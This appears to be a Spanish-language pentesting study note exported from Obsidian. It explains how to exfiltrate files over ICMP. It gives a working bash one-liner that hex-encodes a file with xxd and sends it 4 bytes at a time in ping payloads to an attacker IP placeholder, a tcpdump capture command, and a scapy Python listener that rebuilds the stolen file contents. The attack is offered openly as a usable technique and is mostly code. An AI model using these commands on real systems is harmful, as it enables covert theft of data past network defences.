<!DOCTYPE html> <html><head>
		<title>Robar data por ICMP</title>
		<base href="..\..\..\..\..\..\..\..\../">
		<meta id="root-path" root-path="..\..\..\..\..\..\..\..\../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="Hacking - Robar data por ICMP">
		<meta property="og:title" content="Robar data por ICMP">
		<meta property="og:description" content="Hacking - Robar data por ICMP">
		<meta property="og:type" content="website">
		<meta property="og:url" content="notes/4.-cybersecurity/redteam/pentesting/systems/2.-fases-auditoria/1.-reconocimiento/protocolos/tcp/robar-data-por-icmp.html">
		<meta property="og:image" content="undefined">
		<meta property="og:site_name" content="Hacking">
		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="Robar data por ICMP"><p>Robar data por ICMP</p></h1><div><hr></div><div><ul>
<li data-line="0">Tags: <a href="?query=tag:teoria" class="tag" target="_blank" rel="noopener">#teoria</a> <a href="?query=tag:practica" class="tag" target="_blank" rel="noopener">#practica</a> </li>
</ul></div><div><hr></div><div class="heading-wrapper"><h1 data-heading="IMCP (Internet Menssager  Control Protocol)" class="heading" id="IMCP_(Internet_Menssager__Control_Protocol)">IMCP (Internet Menssager  Control Protocol)</h1><div class="heading-children"><div><p>El protoclo de mansajes de control de internet o <strong>ICMP</strong> es parte del conjutno del protocolo IP. Es utilizado para enciar mensajes de error e información operatia. </p></div><div><hr></div></div></div><div class="heading-wrapper"><h1 data-heading="Exfiltración de data" class="heading" id="Exfiltración_de_data">Exfiltración de data</h1><div class="heading-children"><div><p>Existe una técnica muy interesante para exfiltrar data haciendo uso de la herramienta <strong>ping</strong> y utilidades en python como el modulo <strong>scapy</strong> (pip3 install scapy), esto quiere decir que seríamos capaz de envíar el contenido de todo un archivo mediante traszas icmp para posteriormente hacinedo uso de <strong>scapy</strong> obtener su contenido.</p></div><div><hr></div></div></div><div class="heading-wrapper"><h1 data-heading="Concepto" class="heading" id="Concepto">Concepto</h1><div class="heading-children"><div><p>La herramienta <strong>ping</strong> tiene un parametro el cual es <strong>-p</strong> que nos permite envíar un patrón personalizado que se envía en los paquetes de solicitud de ping. Mayormente se utiliza para verificar la integridad de los paquetes de respuesta recibidos. Cada vez qeu se envía un paquede de ping con un patrón personalizado, el sistema receptor debería devolver un paquete de respuesta que coincida con el patrón enviado. </p></div><div><p>Por lo que entendemos, este patrón puede ser <strong>personalizado</strong>, permitiendonos así envíar valores hexadecimales que querramos. </p></div><div><p>Por otro lado, la herramienta <strong>xxd</strong> nos permite pasar valores a hexadecimal, esta herramienta puede transformar a hexadecimal un archivo completo e incluso separarlo en partes, es decir, de 4 en 4, de 5 en 5, de 20 en 20, como querramos. </p></div><div><p>Si juntamos estos dos conceptos, la idea sería transformar un archivo en hexadecimal alternandolo en valores (Recomendado de 4 en 4) para recorrer cada par de estos 4 bytes y envíar una traza icmp con el patrón que corresponde a estos 4 bytes que íran alternando del archivo que se busca leer, para que de manera posterior con un script en python, haciendo uso de <strong>scapy</strong> poder transformar todas estas trazas a el contenido original del archivo. </p></div><div><hr></div></div></div><div class="heading-wrapper"><h1 data-heading="Exfiltracion de data" class="heading" id="Exfiltracion_de_data">Exfiltracion de data</h1><div class="heading-children"><div><ul>
<li data-line="0">
<h2 data-heading="Envío y recibimiento de trazas icmp" class="heading" id="Envío_y_recibimiento_de_trazas_icmp">Envío y recibimiento de trazas icmp</h2>
</li>
</ul></div><div><p>Como vimos, lo primero sería leer todo el archivo para separarlo en pares de 4 bytes y posteriormente envíar trazas icmp con el valor de estos bytes como patrón. </p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded">xxd -p -c <span class="token number">4</span> <span class="token punctuation">{</span>file_to_read<span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">ping</span> -c <span class="token number">1</span> -p <span class="token variable">$line</span> <span class="token punctuation">{</span>ip<span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">done</span> 

<span class="token keyword">for</span> <span class="token for-or-select variable">line</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span>xxd -p -c <span class="token number">4</span> <span class="token punctuation">{</span>file_to_read<span class="token punctuation">}</span><span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">ping</span> -c <span class="token number">1</span> -p <span class="token variable">$line</span> <span class="token punctuation">{</span>ip<span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">done</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>De manera alterna, previo a realizar esto, deberíamos estar almacenando todas las trazas icmp envíadas en un archivo de captura. </p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token function">sudo</span> tcpdump -i <span class="token punctuation">{</span>interfaz<span class="token punctuation">}</span> icmp -n -v -w Captura.cap
</code><button class="copy-code-button">Copy</button></pre></div><div><p>De esta manera estaremos en escucha de todas las trazas icmp recibidas por una determinada interfaz y estaremos alojando todas estas en un archivo llamado <strong>Captura.cap</strong> </p></div><div><p>Una vez realizado esto ya tendríamos todas las trazas almacenadas listas para ser leidas y obtener la información de interez en el patrón de cada una de estas, para eso usarémos <strong>scapy</strong>. </p></div><div><hr></div><div><ul>
<li data-line="0">
<h2 data-heading="Scapy" class="heading" id="Scapy">Scapy</h2>
</li>
</ul></div><div><p>Para leer un archivo con scapy podrémos hacer uso de la función <strong>rdpcap</strong>, posteriormente para ver cada paquete podríamos guardar el contenido arrojado de la función rdpcac en una variable la cual se convertirá en un array donde cada posición corresponde a un paquete. De esta manera pudiendo acceder a cada paquete, cada uno de estos contiene <strong>layers</strong> como Ether, IP, ICMP, etc. de manera que podríamos acceder a layers para acercarnos más a la información que nos interesa. Una vez que seleccionamos una layer podríamos listar con la función <strong>ls</strong> los atributos de las layers así como acceder a los atributos de las layers. </p></div><div><pre class="language-python" tabindex="0"><code class="language-python is-loaded"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>

packets <span class="token operator">=</span> rdpcap<span class="token punctuation">(</span><span class="token string">"{path_file_.cap}"</span><span class="token punctuation">)</span>

<span class="token comment"># Acceder a distintos paquetes </span>
<span class="token keyword">print</span><span class="token punctuation">(</span>packets<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># Acceder a una layer de un paquete </span>
packets<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>ICMP<span class="token punctuation">]</span>

<span class="token comment"># Listar los atributos de las layers</span>
ls<span class="token punctuation">(</span>packets<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>ICMP<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># Acceder a un atributo </span>
packets<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>ICMP<span class="token punctuation">]</span><span class="token punctuation">.</span>load
</code><button class="copy-code-button">Copy</button></pre></div><div><p>En la layer <strong>ICMP</strong> atributo <strong>load</strong> tendríamos los patrónes envíados a travez de cada una de las trazas icmp transmitidas. Ahora, es <strong>importante</strong> tener en cuenta que los paquetes van a estar repetidos como también puede ser que no contenga la layer ICMP, de manera que para poder listar los contenidos de manera correcta nos deberíamos asegurar de que los paquetes no se repitan, esto lo podríamos realizar con la función <strong>.type</strong> la cual devuelce 8 o 0 dependiendo de si es impar o par. Mientras que el asegurarnos de que el paquete tenga la layer ICMP lo podemos hacer con la función <strong>.haslayer</strong>. </p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token comment"># ........</span>

<span class="token comment"># Verificar el tipo del paquete, si es par o impar</span>
packet<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.type

<span class="token comment"># Verificar si el primer paquete tiene una determinada layer</span>
packet<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.haslayer<span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>De esta manera podríamos utilizar toda esta información para realizar un script en python el cual se encargue de leer un archivo .cap y arrojarnos la información gracias a acceder a todos los patrónes de cada una de las trazas icmp alojadas en el archivo. </p></div><div><pre class="language-python" tabindex="0"><code class="language-python is-loaded"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span> 
<span class="token keyword">import</span> signal<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> readline<span class="token punctuation">,</span> os

<span class="token comment"># Configuration </span>

readline<span class="token punctuation">.</span>parse_and_bind<span class="token punctuation">(</span><span class="token string">"set editing-mode emacs"</span><span class="token punctuation">)</span>

<span class="token comment"># Ctrl + c</span>

<span class="token keyword">def</span> <span class="token function">ctrl_c</span><span class="token punctuation">(</span>sig<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\n\t[!] Quiting...\n\n"</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

signal<span class="token punctuation">.</span>signal<span class="token punctuation">(</span>signal<span class="token punctuation">.</span>SIGINT<span class="token punctuation">,</span> ctrl_c<span class="token punctuation">)</span> 

<span class="token comment"># Data exfiltration</span>

<span class="token keyword">def</span> <span class="token function">sniffTrafic</span><span class="token punctuation">(</span>interface<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+] Your file content: \n"</span><span class="token punctuation">)</span>
    sniff<span class="token punctuation">(</span>iface<span class="token operator">=</span>interface<span class="token punctuation">,</span> prn<span class="token operator">=</span>readICMPpatterns<span class="token punctuation">)</span>
    

<span class="token keyword">def</span> <span class="token function">readICMPpatterns</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span><span class="token punctuation">:</span> 
    
    <span class="token keyword">if</span> packet<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span> <span class="token keyword">and</span> packet<span class="token punctuation">[</span>ICMP<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">type</span> <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>
        line <span class="token operator">=</span> packet<span class="token punctuation">[</span>ICMP<span class="token punctuation">]</span><span class="token punctuation">.</span>load<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span> 
    
    <span class="token keyword">if</span> os<span class="token punctuation">.</span>geteuid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        interface <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n\t[!] Please insert the interface to listen: "</span><span class="token punctuation">)</span>
        sniffTrafic<span class="token punctuation">(</span>interface<span class="token punctuation">)</span> 
    <span class="token keyword">else</span><span class="token punctuation">:</span> 
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\n\t[!] Please run the script as root ツ\n\n"</span><span class="token punctuation">)</span>

</code><button class="copy-code-button">Copy</button></pre></div><div class="mod-footer"></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\2.-fases-auditoria\1.-reconocimiento\protocolos\tcp\robar-data-por-icmp.html#Robar data por ICMP"><div class="tree-item-contents heading-link" heading-name="Robar data por ICMP"><span class="tree-item-title">Robar data por ICMP</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\2.-fases-auditoria\1.-reconocimiento\protocolos\tcp\robar-data-por-icmp.html#IMCP_(Internet_Menssager__Control_Protocol)"><div class="tree-item-contents heading-link" heading-name="IMCP (Internet Menssager  Control Protocol)"><span class="tree-item-title">IMCP (Internet Menssager  Control Protocol)</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\2.-fases-auditoria\1.-reconocimiento\protocolos\tcp\robar-data-por-icmp.html#Exfiltración_de_data"><div class="tree-item-contents heading-link" heading-name="Exfiltración de data"><span class="tree-item-title">Exfiltración de data</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\2.-fases-auditoria\1.-reconocimiento\protocolos\tcp\robar-data-por-icmp.html#Concepto"><div class="tree-item-contents heading-link" heading-name="Concepto"><span class="tree-item-title">Concepto</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\2.-fases-auditoria\1.-reconocimiento\protocolos\tcp\robar-data-por-icmp.html#Exfiltracion_de_data"><div class="tree-item-contents heading-link" heading-name="Exfiltracion de data"><span class="tree-item-title">Exfiltracion de data</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\2.-fases-auditoria\1.-reconocimiento\protocolos\tcp\robar-data-por-icmp.html#Envío_y_recibimiento_de_trazas_icmp"><div class="tree-item-contents heading-link" heading-name="Envío y recibimiento de trazas icmp"><span class="tree-item-title">Envío y recibimiento de trazas icmp</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\systems\2.-fases-auditoria\1.-reconocimiento\protocolos\tcp\robar-data-por-icmp.html#Scapy"><div class="tree-item-contents heading-link" heading-name="Scapy"><span class="tree-item-title">Scapy</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>